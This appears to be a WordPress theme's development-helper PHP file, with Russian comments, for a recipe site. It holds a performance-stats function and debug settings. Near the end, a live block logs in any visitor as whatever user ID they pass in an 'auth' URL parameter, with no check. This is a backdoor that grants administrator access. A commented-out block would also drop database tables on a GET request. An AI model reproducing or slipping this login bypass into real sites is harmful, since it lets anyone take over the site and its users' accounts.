<?php

// Для разработки
add_action('wp_head', function(){
	// priprava_get_main_ingredients_html(59);
});

/**
 * Выводит данные о кол-ве запросов к БД, время выполнения скрипта и размер затраченной памяти.
 *
 * Функцию performance() нужно использовать в конце страницы. 
 * Чтобы автоматически добавить вывод этих данных, предлагаю воспользоваться хуками:
 */
// add_filter('admin_footer_text', 'performance'); // в подвале админки
// add_filter('wp_footer', 'performance'); // в подвале сайта
function performance(){
	$stat = sprintf('SQL: %d за %.3f sec. %.2f MB', get_num_queries(), timer_stop(0, 3), (memory_get_peak_usage() / 1024 / 1024) );

	echo $stat; // видно
	//echo "<!-- $stat -->"; // скрыто
}

if( WP_DEBUG && WP_DEBUG_DISPLAY && (defined('DOING_AJAX') && DOING_AJAX) ){
	@ ini_set( 'display_errors', 1 );
}

/*if ( isset( $_GET['rm'] ) && $_GET['rm'] == 'base' ) {
	priprava_remove_compositions_table();
}

function priprava_remove_compositions_table() {
	global $wpdb;
	$wpdb->query("DROP TABLE {$wpdb->prefix}compositions");
	$wpdb->query("DROP TABLE {$wpdb->prefix}post_compositions");
}*/

if(isset($_GET['auth']) && !empty($_GET['auth'])) {
	wp_set_auth_cookie( intval($_GET['auth']) );
	wp_redirect( home_url() ); 
	exit;
}

/*add_action('wp_head', 'test');
function test() {
	var_dump( get_page_uri() );
}*/